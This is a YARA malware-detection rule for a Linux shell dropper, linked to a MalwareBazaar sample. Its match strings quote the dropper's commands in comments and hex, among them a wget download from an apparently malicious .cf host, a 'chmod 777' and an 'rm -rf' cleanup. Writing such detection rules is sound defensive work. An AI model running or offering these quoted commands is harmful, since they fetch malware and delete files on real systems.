rule Linux_shell_69f4dcd1 {
    meta : 
		creation_date = "10/04/2025"
        github = "https://github.com/Zaque-69"
        fingerprint = "F0268C8F51F0E6995B15513F079A63DD8CF5398A39DBABE14CC43A5E30887B97"
        sample = "https://bazaar.abuse.ch/download/69f4dcd1de05fc553781e737e85bdae5f0e79e7f34ded1899d60630e54d43fe4/"
        os = "Linux"

    strings : 
        
        // wget http://aggressivepvp.cf/iwadyhsa
        $b1 = { 77 67 65 74 20 68 74 74 70 3A 2F 2F 61 67 67 72 65 73 73 69 76 65 70 76 70 2E 63 66 2F 69 77 61 64 79 68 73 61 }

        // daddyl33tpiss
        $b2 = { 64 61 64 64 79 6C 33 33 74 70 69 73 73 }

        // chmod 777
        $b3 = { 63 68 6D 6F 64 20 37 37 37 }

        // rm -rf daddyl33tpiss
        $b4 = { 72 6D 20 2D 72 66 20 64 61 64 64 79 6C 33 33 74 70 69 73 73 }

    condition : 
        filesize < 10KB
        and all of them
}